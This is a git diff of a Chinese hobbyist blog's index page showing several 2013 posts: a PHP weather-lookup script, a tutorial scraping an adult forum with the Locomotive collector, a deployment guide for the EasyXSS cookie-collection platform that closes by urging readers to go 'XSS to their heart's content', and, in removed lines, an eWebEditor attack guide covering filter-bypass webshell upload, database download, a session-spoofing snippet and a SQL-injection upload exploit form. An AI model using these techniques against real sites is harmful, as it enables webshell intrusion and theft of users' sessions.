@@ -121,7 +121,7 @@ function dispatch() {
 					        
 								<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
 					        
-								<a class="rss" target="_blank" href="https://doubleshift.github.io/rss.xml" title="rss">rss</a>
+								<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
 					        
 								<a class="mail" target="_blank" href="/fjjwlzd@163.com" title="mail">mail</a>
 					        
@@ -184,7 +184,7 @@ function dispatch() {
 			        
 						<a class="weibo" target="_blank" href="https://weibo.com/agmol" title="weibo">weibo</a>
 			        
-						<a class="rss" target="_blank" href="https://doubleshift.github.io/rss.xml" title="rss">rss</a>
+						<a class="rss" target="_blank" href="http://doubles.me/rss.xml" title="rss">rss</a>
 			        
 						<a class="mail" target="_blank" href="/fjjwlzd@163.com" title="mail">mail</a>
 			        
@@ -195,6 +195,252 @@ function dispatch() {
 </nav>
 
       <div class="body-wrap">
+  
+    <article id="post-600" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/03/19/600/" class="article-date">
+  	<time datetime="2013-03-19T13:44:44.000Z" itemprop="datePublished">2013-03-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/03/19/600/">查询天气</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>给微信公众平台添加的一个小功能。实现查询天气。 百度得到3个地址接口，当然也可以用google，yahoo的，但是发现只有这一个是json的。所以我就用这个了。</p>
+<p><span style="font-family: Arial;"><a href="http://www.weather.com.cn/data/sk/101281601.html" target="_blank" rel="external">http://www.weather.com.cn/data/sk/101281601.html</a> </span></p>
+<p><span style="font-family: Arial;"><a href="http://www.weather.com.cn/data/cityinfo/101281601.html" target="_blank" rel="external">http://www.weather.com.cn/data/cityinfo/101281601.html</a> </span></p>
+<p><span style="font-family: Arial;"><a href="http://m.weather.com.cn/data/101281601.html" target="_blank" rel="external">http://m.weather.com.cn/data/101281601.html</a>  </span></p>
+<p>然后继续百度到一个城市列表，这个网站也没有提供什么api，只有这样了。把这个id表存入数据库吧。</p>
+<p>挺麻烦的，不过我还是用excel+php+mysql搞定了。</p>
+<p>先用excel拆分一下。</p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130319234120.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130319234120.png" alt="QQ20130319234120"></a></p>
+<p>然后写个php，提取一下里面的数据。</p>
+<p>&lt;?php</p>
+<p>$fp = fopen (‘cityid.txt’, “r”);<br>if($fp){<br>while(!feof($fp)){<br>$line1=fgets($fp,4096);<br>$name=split(‘ ‘,$line1);</p>
+<p>$line2=fgets($fp,4096);<br>$id=split(‘ ‘,$line2);</p>
+<p>for($i=0;$i&lt;count($name);$i++){<br>$current.= ‘(“‘.$name[$i].’”,’.$id[$i].’),’;</p>
+<p>}<br>}<br>}else echo’wrong’;<br>file_put_contents(‘result.txt’, $current);<br>fclose($fp);<br>?&gt;</p>
+<p>这个过程真心麻烦。然后实现查询功能。<br>&lt;?php<br>//101240101 南昌id<br>header(“Content-Type: text/html;charset=utf-8”);<br>function getWeather($id){<br>$fetch= new BaeFetchUrl();</p>
+<p>$fetch-&gt;get(“<a href="http://m.weather.com.cn/data/&quot;.$id.&quot;.html" target="_blank" rel="external">http://m.weather.com.cn/data/&quot;.$id.&quot;.html</a>“);</p>
+<p>$obj=json_decode($fetch-&gt;getResponseBody());</p>
+<p>$value=$obj-&gt;weatherinfo-&gt;city.’ ‘.$obj-&gt;weatherinfo-&gt;date_y.’ ‘.$obj-&gt;weatherinfo-&gt;temp1.’ ‘.$obj-&gt;weatherinfo-&gt;weather1.’ ‘.$obj-&gt;weatherinfo-&gt;index_d;</p>
+<p>return $value;<br>}<br>?&gt;</p>
+<p>&nbsp;</p>
+<p>看得到我这里使用了bae上的函数。</p>
+<p>最后放个文件到这里吧。<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/天气处理.zip" target="_blank" rel="external">天气处理</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/微信公众平台/">微信公众平台</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Code/">Code</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
+  
+    <article id="post-577" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/03/12/577/" class="article-date">
+  	<time datetime="2013-03-12T13:44:42.000Z" itemprop="datePublished">2013-03-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/03/12/577/">火车头采集器【本次纯属测试】</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&nbsp;</p>
+<h1 id="首先申明一下，此次纯属测试，没有任何不良用途。"><strong><span style="color: #ff0000;">首先申明一下，此次纯属测试，没有任何不良用途。</span></strong></h1><p>不知道为什么对采集很敢兴趣，先用火车头采集一点东西吧。</p>
+<p>主要是要写采集模块，但是前面写过phpcms和dedecms的采集规则，现在就比较简单了。</p>
+<p>看草榴的网址，<a href="http://1024dizhi.tk/thread0806.php?fid=7&amp;search=&amp;page=2" target="_blank" rel="external">http://1024dizhi.tk/thread0806.php?fid=7&amp;search=&amp;page=2</a> 显然修改page后面的就可以访问下一页了。所以从2开始到最后一页，不过我发现非注册用户只能访问前100页，我的帐号也登不上去了。o(︶︿︶)o 唉就抓100页把，后面的大部分图床都挂掉了。</p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230639.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230639.png" alt="QQ20130312230639"></a></p>
+<p>&nbsp;</p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230734.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312230734.png" alt="QQ20130312230734"></a></p>
+<p>&nbsp;</p>
+<p> 然后编写内容网址采集规则，每条内容页都是这样的形势，他在最后用了一个javascript进行拼接，所以我们就要自己写规则，拼接地址<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231245.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231245.png" alt="QQ20130312231245"></a></p>
+<p>设置成这样的，看图就行了，记得保存<a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231212.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231212.png" alt="QQ20130312231212"></a></p>
+<p>然后我们进到内容页，发现文章开始的标签是tpc_content，标题的开始标签是&lt;h4&gt;，注意这些不能有重复。然后就可以写规则开始采集了。</p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231528.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231528.png" alt="QQ20130312231528"></a></p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231428.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312231428.png" alt="QQ20130312231428"></a></p>
+<p>之后我挂了一晚上，线程不敢开太多，怕封ip，抓取了5000条数据。</p>
+<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233110.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233110.png" alt="QQ20130312233110"></a></p>
+<p>再然后就是发布了，可以选择数据入数据库，也可以选择发布到web上去。但是呢，进入数据库要分析表结构，太懒，不相干，就web发布吧。这样效率特别低，不过丢这也不用管，就这样了呗。</p>
+<p>现在写发布过程</p>
+<p><div></div></p>
+<p><div>先把dedecms安装好，其他的phpcms之类的也一样，安装也不用说了吧。</div></p>
+<p><div>进入后先个增加这些个栏目，别看我这个网站，我只是想要一个木有广告的自己用。。</div></p>
+<p><div></div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image.png" alt="Image"></a></div></p>
+<p><div></div></p>
+<p><div>选择dedecms5.7的发布模块，编码是utf8，看版本决定，然后把网站根目录写进来，</div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image2.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image2.png" alt="Image2"></a></div></p>
+<p><div>点击登入，抓到cookies，点确定，然后保存配置。</div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image3.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image3.png" alt="Image3"></a></div></p>
+<p><div></div></p>
+<p><div>然后选择一个任务，进行编辑，定位到发布设置，然后3个步骤改一下。保存之。</div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image4.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/Image4.png" alt="Image4"></a></div></p>
+<p><div></div></p>
+<p><div>最后我们到网站上看一下效果</div></p>
+<p><div></div></p>
+<p><div></div></p>
+<p><div></div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233941.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312233941.png" alt="QQ20130312233941"></a></div></p>
+<p><div></div></p>
+<p><div><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312234204.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/QQ20130312234204.png" alt="QQ20130312234204"></a></div></p>
+<p><div></div></p>
+<div>
+
+<h1 id="再次申明一下，此次纯属测试，没有任何不良用途。"><span style="color: #ff0000;"><strong>再次申明一下，此次纯属测试，没有任何不良用途。</strong></span></h1><h1 id="如果有人用于非法用途，与本博客无关。"><span style="color: #ff0000;"><strong>如果有人用于非法用途，与本博客无关。</strong></span></h1><p></p></div><br>&nbsp;<p></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂碎/">杂碎</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网站/">网站</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Others/">Others</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
+  
+    <article id="post-560" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2013/03/12/560/" class="article-date">
+  	<time datetime="2013-03-12T03:09:44.000Z" itemprop="datePublished">2013-03-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2013/03/12/560/">easyxss平台搭建</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div><span style="color: #ff0000;">bae上搭建easyxss</span>【如果不是bae，sae上就不需要】</div><br><div>@<a href="http://zone.wooyun.org/user/%E6%98%B5%E7%A7%B0" target="_blank" rel="external">昵称</a> 目测bae和sae都是要使用重写功能<br>bae  修改 app.conf<br>格式：<br>- url : /member/(.+)$<br>script : member.php?mid=$1</div><br><div></div><br><div>sae修改 config.yaml<br>格式：<br>- rewrite: if( path ~ “^feed$” ) goto “feed.php”</div><br><div></div><br><div>测试发现，bae上搭建不了。应该要修改thinkphp，所以使用phpcloud来搭建。</div><br><div></div><br><div></div><br><div><span style="color: #ff0000;"> App/Conf/config.php 配置文件</span></div><br><div></div><br><div>&lt;?php<br>return array(<br>‘DEFAULT_MODULE’     =&gt; ‘User’,<br>‘URL_MODEL’          =&gt; ‘0’, //这里改成0，原来是2，具体设置请参考THINKPHP配置说说明<br>‘SESSION_AUTO_START’ =&gt; true,<br>‘DB_DSN’ =&gt; ‘mysql://root:toor@127.0.0.1:3306/xss’, //数据库链接信息，用户名@密码，最后的是数据库名<br>‘DB<em>PREFIX’ =&gt; ‘xss</em>‘,<br>‘MAIL_ADDRESS’=&gt;’info@xss.tw’,<br>‘MAIL_SMTP’=&gt;’smtp.gmail.com’,<br>‘MAIL_LOGINNAME’=&gt;’info@xss.tw’,<br>‘MAIL_PASSWORD’=&gt;’’,<br>‘MAIL_SENDER’=&gt;’info’,<br>‘MAIL_PORT’=&gt;’465’,<br>‘TMPL_PARSE_STRING’ =&gt;array(<br>‘<strong>SITENAME</strong>‘ =&gt;’EasyXSS 1.0’,<br>‘<strong>SITETITLE</strong>‘=&gt;’EasyXSS’,<br>),<br>);<br>?&gt;</div><br><div></div><br><div><span style="color: #ff0000;">wwwroot目录是web根目录，wwwroot/index.php定义了framework与application的路径，你改了就要跟着改。</span></div><br><div></div><br><div>&lt;?php<br>define(‘APP_NAME’, ‘./XSS’);<br>define(‘APP_PATH’, ‘./../App/‘); //App那个文件夹的路径，改掉了就跟着改<br>define(‘APP_DEBUG’, true); //debug开关require ‘./../ThinkPHP/ThinkPHP.php’; //thinkphp framework 的路径?&gt;</div><br><div></div><br><div>data.sql导入数据库，这里不说了。</div><br><div></div><br><div></div><br><div>有一个邀请码：1234567890<br>请注册名字为：root的用户，才能生成邀请码</div><br><div></div><br><div>注册一个用户名为root的用户，</div><br><div>邀请码生成URL：/Key/createKey/count/1/type/1<br>count为数量，type为类型:0为自助申请，1为手动发放的邀请码，不被自助申请获得到</div><br><div><img src="file:///C:/Users/Daddy/AppData/Local/Temp/enhtmlclip/Image.png" alt=""></div><br><div>界面模仿xsser.me,PHP代码没参考任何其他平台，所以写得很烂。现在的新版本基本上重写，主要方面是用户权限控制，使用类的继承，方便多了。keepsession： 定期访问 /Xssresult/Keepsession 即可，或者定期执行Keepsession文件夹下的php脚本。</div><br><div></div><br><div><br><br>phpcloud申请账号，然后创建一个app。<br><br>然后会得到一个key，.ppt的这时候用winscp连上去。<br><br>，地址如下，很多都是你设置的容器的名字。<br><br>如下图<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/3.bmp" alt="3"></a><br><br>&nbsp;<br><br>然后将这个我修改好的easyxss平台代码丢上去，修改所有目录属性为777。不然会提示run error，因为没有写入权限。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/4.bmp" alt="4"></a><br><br>&nbsp;<br><br>然后修改conf文件，最好用notepad++修改好了再覆盖上去。不然会有其他的错误<br><br>Assuming your container name is <code>**_mycontainer_**</code>, you should use the following credentials to connect to your database:<br><br><em>   <strong>Database host:</strong><em>mycontainer</em>-db.my.phpcloud.com
+</em>   <strong>Database port:</strong> 3306<br><em>   <strong>Database schema name:</strong><em>mycontainer</em>
+</em>   <strong>Database user:</strong><em>mycontainer</em><br><em>   <em>*Database password:</em></em> your container password导入mysql数据库，可以使用phpadmin或者ssh的方式<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/5.bmp" alt="5"></a><br>我导入的是去掉iptables的，因为他这个ip表有20多m，不好上传。等我回寝室再导入把。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>然后进入dnspod，把域名绑定以下。<br><br>&nbsp;<br><br>将域名cname到 <em>mycontainer</em>.my.phpcloud.com，就是你可以直接访问的地址。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/6.bmp" alt="6"></a> <a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/11.bmp" alt="1(1)"></a><br><br>现在就可以通过绑定的域名进行访问了。<br><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/03/21.bmp" alt="2(1)"></a><br><br>&nbsp;<br><br>然后要注意的是phpcloud必须要每天登入一次来激活，这个可以使用我们的监控宝来完成<br><br></div><br><div><br><br>到此我们就完成平台搭建的所有工作，然后可以使用url缩短服务，尽情的xss去吧。<br><br></div><br><div></div>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/云/">云</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/Hack/">Hack</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+
   
     <article id="post-542" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -954,366 +1200,6 @@ Page Views per Visit: ![](http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/
 <p>最后可以看这里的，比较新哦html5安全相关。</p>
 <p><a href="http://html5sec.org/" target="_blank" rel="external">http://html5sec.org/</a></p>
 <p>&nbsp;</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Hack/">Hack</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
-    <article id="post-378" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2013/02/09/378/" class="article-date">
-  	<time datetime="2013-02-09T19:55:58.000Z" itemprop="datePublished">2013-02-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2013/02/09/378/">迁移wordpress/网站搬家同时更改URL更改域名</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="无缘无故白屏了，也不知道怎么解决，然后就只能重新安装一下。数据库和附件也给整理了一下，比较麻烦的说。这里是网上找到的一篇文章，mark吧。">无缘无故白屏了，也不知道怎么解决，然后就只能重新安装一下。数据库和附件也给整理了一下，比较麻烦的说。这里是网上找到的一篇文章，mark吧。</h3><h3 id="步骤1：备份数据库"><strong>步骤1：备份数据库</strong></h3><div><br><br>登陆到phpMyAdmin，到mysql后台，选择wordpress数据所在的数据库，点击“导出”或是英文的”Export”把数据库数据备份到你本地。建议选择导出格式为SQL。如果数据量较大，建议在导出页面下方选择.zip或.gzip压缩格式，这样文件会小一些。<br><br><strong>步骤2：备份wordpress网站所有文件</strong><br>用FTP或你的空间商提供的方式吧所有wordpress的文件备份到你本地。建议压缩后再FTP到本地，这样速度快，也不会出现文件传输过程中发生的某些传输错误造成文件不完整。<br><br><strong>步骤3：恢复数据库到你的新空间</strong><br>登陆到你的新空间的phpMyAdmin，到mysql后台，点击“导入”或是英文的“Import”把数据库恢复到你的新空间，即导入步骤1备份的文件。<br><br><strong>步骤4：恢复网站文件到你的新空间</strong><br>用FTP或你的空间商提供的方式把所有的网站文件上传的你的新空间。即导入步骤2备份的文件。<br><br><strong>步骤5：更改配置文件wp-config.php</strong><br>wp-config.php位于根目录，你至少需要修改如下项目：（这些项目买空间是，空间商会给你）<br><br><em>   <a href="http://totem.co/tag/wordpress-2" title="查看 WordPress 中的全部文章" target="_blank" rel="external">WordPress</a> 数据库的名称
-</em>   MySQL 数据库用户名<br><em>   MySQL 数据库密码
-</em>   MySQL 主机 — 这项通常是 ‘localhost’<br><span style="color: #ff0000;">如果白屏的话，删除config这个文件，然后再来安装一遍，让它自动生成。主题插件也移除掉。</span><br><strong>步骤6：注意检查文件.htaccess</strong><br>（如果你的网站路径与迁移前的一模一样，这一步可以省略）这一步一定要注意，RewriteBase及RewriteRule这两项一定要设置正确。我的网站根路径于原先的不同，这里又没设置正确才发生500错误。<br><br><strong>步骤7：后台数据库修改siteurl及home项</strong><br>（如果你的网站路径及URL与迁移前的一模一样，这一步可以省略），登陆到你的新空间的phpMyAdmin，在后台数据库里修改你的siteurl，找到表wp_options，作如下修改：<br><br><em>   找到option_id字段值为1，option_name字段值为siteurl的记录，修改option_value字段值，比如原先你的值为<a href="http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。" target="_blank" rel="external">http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。</a>
-</em>   找到option_id字段值为37，option_name字段值为home的记录，修改option_value字段值，跟上面的是一样的，比如原先你的值为<a href="http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。" target="_blank" rel="external">http://www.wnshare.com/blog，当前已经变为http://www.wnshare.com，把这个值改为http://www.wnshare.com。</a><br><strong>步骤8：到你的<a href="http://totem.co/tag/%e5%9f%9f%e5%90%8d" title="查看 域名 中的全部文章" target="_blank" rel="external">域名</a>注册商网站修改A记录</strong><br>新的IP地址在买空间时，空间商会告诉你，别忘了把新的IP地址更新上去，国内的通常1到2小时就会生效。<br><br>### 步骤8：修改数据库<br><br>数据库中可能会有一些文件地址，或者其他什么的需要更改，这时就要用到这个了。<br><br>这个将文中所有的图片地址改掉，当然也可以改其他的。<br><br>UPDATE wp_posts SET post_content = REPLACE( post_content, ‘<a href="http://7xnueu.com1.z0.glb.clouddn.com/2012/01/" target="_blank" rel="external">http://7xnueu.com1.z0.glb.clouddn.com/2012/01/</a>‘, ‘<a href="http://127.0.0.1/" target="_blank" rel="external">http://127.0.0.1/</a>‘ );<br><br></div>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/Web/">Web</a>
-	</div>
-
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-
-  
-    <article id="post-376" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2013/02/08/376/" class="article-date">
-  	<time datetime="2013-02-08T20:21:33.000Z" itemprop="datePublished">2013-02-08</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2013/02/08/376/">常见的一些编辑器漏洞</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>常见的一些编辑器:ewebeditor ewebeditornet fckeditoreditor southidceditor SouthidcEditor bigcneditor</p>
-<p>其实如果大家多关注编辑器的话,会有惊人的发现,尤其是jsp,php版的,一个webshell基本上就是一台服务器啊~~~</p>
-<p>一:首先说说最近不断爆洞的ewebeditor</p>
-<p>(一)ASP版<br>1:默认管理后台:</p>
-<p><a><a href="http://www.test.com/ewebeditor/admin_login.asp" target="_blank" rel="external">http://www.test.com/ewebeditor/admin_login.asp</a></a></p>
-<p>后台如果能进入:</p>
-<p>可点击样式管理:</p>
-<p>standard 拷贝一份(直接修改改不了)</p>
-<p>在拷贝的一份里加入图片类型( asa aaspsp ) 然后点预览</p>
-<p>在编辑器里点设计 然后直接上传asa大马.</p>
-<p>上传后 在代码里可以看到马的位置!</p>
-<p>(原理:因为在iis里 网站的属性里 应用程序配置一项 asa扩展名还是用asp.dll来解析的,asp也是 还有 cer cdx )</p>
-<p>在cer cdx asa的被删掉 那么马儿就找不到 映射不过去.</p>
-<p>可以在拷贝过后的样式 图片类型里加入 aaspsp 然后在上传 直接就可以上传asp文件<br>2:下载默认数据库</p>
-<p><a>www.test.com/ewebeditor/db/ewebeditor.mdb</a></p>
-<p>然后分析数据库</p>
-<p>webeditor_system(1) 就可以看到用户名和密码 如果破解不出来</p>
-<p>可以在webeditor_style(14 样式表里</p>
-<p>主要看允许上传文件的扩展名(s-fileext s_ingeext)</p>
-<p>看到一个小黑客曾经搞过 多了asa aaspsp</p>
-<p>可以用他来利用!(后台找不到的情况下也可以用此方法)</p>
-<p>可以构造语句:</p>
-<p>比如 ID=46 s-name =standard1</p>
-<p>构造 代码: ewebeditor.asp?id=content&amp;style=standard</p>
-<p>ID和和样式名改过后</p>
-<p>ewebeditor.asp?id=46&amp;style=standard1<br>然后就是进入编辑器 上传asa 或者asp的 得到webshell</p>
-<p>前面的1跟2说的是asp版的ewebeditor,其他如php,jsp跟asp的差不多,这里不多说.</p>
-<p>针对这种方法可能出现的问题:</p>
-<p>(1)．使用默认用户名和密码无法登录。<br>请试试直接下载db目录下的ewebeditor.mdb文件，用户名和密码在eWebEditor_System表中，经过了md5加密，如果无法下载或者无法</p>
-<p><em>**</em>，那就当自己的运气不好了。<br>(2)．加了asa类型后发现还是无法上传。<br>应该是站长懂点代码，自己修改了Upload.asp文件，但是没有关系，按照常人的思维习惯，往往会直接在sAllowExt = Replace</p>
-<p>(UCase(sAllowExt), “ASP”, “”)一句上修改，我就看见过一个站长是这样修改的：<br>sAllowExt = Replace(Replace(Replace(Replace(Replace(UCase(sAllowExt), “ASP”, “”), “CER”, “”), “ASA”, “”), “CDX”, “”),</p>
-<p>“HTR”, “”)<br>猛一看什么都过滤了，但是我们只要在上传类型中增加“aaspsp”，就可以直接上传asp文件了。呵呵，是不是天才的想法？“aaspsp</p>
-<p>”过滤了“asp”字符后，反而变成了“asp”！顺便告诉大家一个秘密，其实动网论坛7.0 sp2中也可以利用类似的方法绕过对扩展名</p>
-<p>的过滤。<br>(3)．上传了asp文件后，却发现该目录没有运行脚本的权限。<br>呵呵，真是好笨啊，上传类型可以改，上传路径不是也可以修改的吗？</p>
-<p>(4)．已经使用了第2点中的方法，但是asp类型还是无法上传。<br>看来站长肯定是一个写asp的高手，但是我们还有最后一招来对付他：看到“远程类型”了吗？eWebEditor能够设定自动保存远程文件</p>
-<p>的类型，我们可以加入asp类型。但是如何才能让远程访问的asp文件能够以源码形式保存呢？方法是很多的，最简单的方法是将IIS中</p>
-<p>的“应用文件映射”中的“asp”删除。</p>
-<p>漏洞原理<br>漏洞的利用原理很简单，请看Upload.asp文件：<br>任何情况下都不允许上传asp脚本文件<br>sAllowExt = Replace(UCase(sAllowExt), “ASP”, “”)<br>因为eWebEditor仅仅过滤了ASP文件。记得我第一次使用eWebEditor时就在纳闷：既然作者已经知道asp文件需要过滤，为什么不同时</p>
-<p>过滤asa、cer等文件呢？也许这就是对免费用户不负责任的表现吧！</p>
-<p>3.eWebEditor session欺骗漏洞</p>
-<p>eWebEditor在线编辑器</p>
-<p>漏洞文件:Admin_Private.asp</p>
-<p>漏洞语句:&lt;%</p>
-<p>If Session(“eWebEditor_User”) = “” Then</p>
-<p>Response.Redirect “admin_login.asp”</p>
-<p>Response.End</p>
-<p>End If</p>
-<p>只判断了session，没有判断cookies和路径的验证问题。</p>
-<p>漏洞利用:</p>
-<p>新建一个h4x0r.asp内容如下:</p>
-<p>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;</p>
-<p>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp</p>
-<p>漏洞影响:虚拟主机的克星.</p>
-<p>4.ewebeditor asp版 2.1.6 上传漏洞</p>
-<p>&lt;H1&gt;ewebeditor asp版 2.1.6 上传漏洞利用程序&lt;/H1&gt;&lt;br&gt;</p>
-<p>&lt;form action=”<a><a href="http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye" target="_blank" rel="external">http://127.1/e/upload.asp?action=save&amp;type=IMAGE&amp;style=luoye</a>‘</a> union select</p>
-<p>S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%</p>
